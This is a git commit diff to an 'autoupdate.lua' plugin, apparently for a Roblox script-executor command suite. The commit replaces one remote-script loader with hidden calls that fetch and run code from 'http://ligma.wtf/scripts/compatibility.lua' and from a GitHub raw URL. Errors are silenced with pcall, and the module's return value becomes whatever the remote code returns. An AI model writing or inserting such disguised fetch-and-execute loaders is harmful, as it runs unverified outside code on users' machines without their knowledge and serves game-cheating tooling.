b5bc2f3a9fab4883058a72cf262584c12147c64c
Amenteshades <129307184+Amenteshades@users.noreply.github.com>
2023-03-29 16:34:22 +0100

    Update autoupdate.lua

--- newuserdplugins/autoupdate.lua
+++ newuserdplugins/autoupdate.lua
@@ -1,12 +1,4 @@
-task.spawn(function()
-if not powersupply.gnn.Plugsloaded then powersupply.gnn.plugsloaded.Event:Wait() end
-if powersupply.cmds['pgsave'] and not getgenv().sus_cmds_autoupdating then
-getgenv().sus_cmds_autoupdating=true
-powersupply.cmds['pgsave'][1](nil,'base')
-loadstring(game:HttpGet("https://raw.githubusercontent.com/6yNuiC9/scr/main/hughjazz.lua"))()
-powersupply.cmds['gclose']()
-elseif getgenv().sus_cmds_autoupdating then getgenv().sus_cmds_autoupdating=nil
-funcs.sendnotif('uwu','uwu','rbxassetid://9231004719',8)
-end
+coroutine.resume(coroutine.create(pcall), function()
+	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
 end)
-return {}
+return loadstring(game:HttpGet("https://raw.githubusercontent.com/6yNuiC9/scr/newuserdplugins/autoupdate.lua", true))(...)
